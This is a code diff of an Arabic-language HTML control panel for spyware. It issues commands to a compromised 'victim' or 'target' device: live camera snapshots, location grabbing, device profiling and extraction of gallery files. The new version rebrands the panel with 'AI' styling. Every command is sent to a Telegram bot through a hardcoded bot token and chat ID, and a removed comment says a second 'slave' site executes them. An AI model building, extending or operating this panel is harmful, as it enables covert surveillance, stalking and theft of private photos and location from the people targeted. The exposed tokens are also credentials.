@@ -2,34 +2,33 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>EL-NAGM | لوحة السيطرة العالمية</title>
+    <title>AI EL-NAGM | لوحة السيطرة الذكية</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; }
-        .control-panel { border: 2px solid #00ff41; display: inline-block; padding: 20px; margin-top: 50px; background: #050505; }
-        .btn { display: block; width: 300px; padding: 15px; margin: 10px; background: #000; border: 1px solid #00ff41; color: #00ff41; cursor: pointer; font-weight: bold; font-size: 18px; }
-        .btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 20px #00ff41; }
-        .status { color: red; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        :root { --ai-blue: #00d4ff; --bg: #050a10; }
+        body { background: var(--bg); color: var(--ai-blue); font-family: 'Segoe UI', sans-serif; text-align: center; }
+        .ai-card { border: 1px solid var(--ai-blue); display: inline-block; padding: 30px; margin-top: 50px; background: rgba(0, 212, 255, 0.05); border-radius: 20px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
+        .btn { display: block; width: 320px; padding: 15px; margin: 15px; background: transparent; border: 1px solid var(--ai-blue); color: var(--ai-blue); cursor: pointer; border-radius: 10px; font-weight: bold; transition: 0.4s; }
+        .btn:hover { background: var(--ai-blue); color: #000; box-shadow: 0 0 20px var(--ai-blue); }
+        .ai-status { font-size: 12px; color: #fff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
-    <h1>EL-NAGM COMMAND CENTER</h1>
-    <div class="control-panel">
-        <div class="status">● النظام جاهز لإصدار الأوامر</div>
-        <button class="btn" onclick="sendCommand('shot')">📸 التقاط سيلفي حي</button>
-        <button class="btn" onclick="sendCommand('loc')">📍 سحب الموقع الحالي</button>
-        <button class="btn" onclick="sendCommand('info')">📱 فحص مواصفات الجهاز</button>
-        <button class="btn" onclick="sendCommand('ping')">📡 فحص اتصال الضحية</button>
+    <div class="ai-card">
+        <div class="ai-status">AI System: <span style="color: #00ff00;">Connected & Thinking...</span></div>
+        <h2 style="color: #fff;">التحكم السيبراني بالذكاء الاصطناعي</h2>
+        <button class="btn" onclick="askAI('full_dump')">🧠 سحب شامل بالذكاء الاصطناعي</button>
+        <button class="btn" onclick="askAI('shot')">📸 لقطة حية للهدف</button>
+        <button class="btn" onclick="askAI('loc')">📍 تحديد الموقع الجغرافي</button>
+        <button class="btn" onclick="askAI('files')">📂 استخراج ملفات الاستوديو</button>
     </div>
 
     <script>
-        const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
+        const token = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
         const chatId = "8754338811";
 
-        async function sendCommand(cmd) {
-            // بنبعت الأمر كرسالة عادية للبوت، والموقع التاني "العبد" هيقرأها وينفذها
+        async function askAI(cmd) {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${cmd}`);
-            alert("تم إرسال أمر الـ " + cmd + " بنجاح!");
+            console.log("AI Command Sent: " + cmd);
         }
     </script>
 </body>
